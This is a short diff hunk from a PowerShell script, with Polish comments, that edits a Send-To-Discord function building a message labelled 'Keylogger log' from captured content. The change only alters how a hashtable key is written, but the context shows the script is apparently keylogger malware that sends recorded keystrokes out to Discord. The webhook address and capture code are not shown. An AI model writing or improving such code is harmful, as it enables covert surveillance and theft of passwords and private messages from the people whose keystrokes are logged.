@@ -37,7 +37,7 @@ function Send-To-Discord {
 
             # Poprawiona definicja payload w HashTable
             $payload = @{
-                "content" = "📝 **Keylogger log:**`n```\n$content\n```"
+                content = "📝 **Keylogger log:**`n```\n$content\n```"
             }
 
             # Konwertowanie na JSON
